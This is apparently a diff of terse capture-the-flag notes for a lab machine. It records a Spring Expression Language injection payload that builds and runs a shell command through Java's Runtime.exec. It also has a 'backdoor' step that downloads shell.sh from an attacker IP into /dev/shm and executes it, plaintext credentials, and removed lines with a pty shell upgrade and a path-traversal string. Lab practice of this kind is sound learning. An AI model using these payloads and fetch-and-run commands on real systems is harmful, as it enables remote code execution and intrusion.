@@ -25,29 +25,21 @@ SpEl vuln in name parameter
 Reading etc/passwd file
 
 payload
+
 ```
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec((T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(116))).getInputStream())}
 ```
 
+Foothold
+
 backdoor
 
+```
 curl 10.10.16.17/shell.sh -o /dev/shm/shell.sh
-
 chmod +x /dev/shm/shell.sh
-
 bash /dev/shm/shell.sh
-
+```
 
 username : woodenk
 password : RedPandazRule
 
-
-/usr/local/sbin
-
- python3 -c "import pty;pty.spawn('/bin/bash')"
-
-
-
-woodenk_creds.xml
-
-../../../../../../dev/shm/dots.jpg
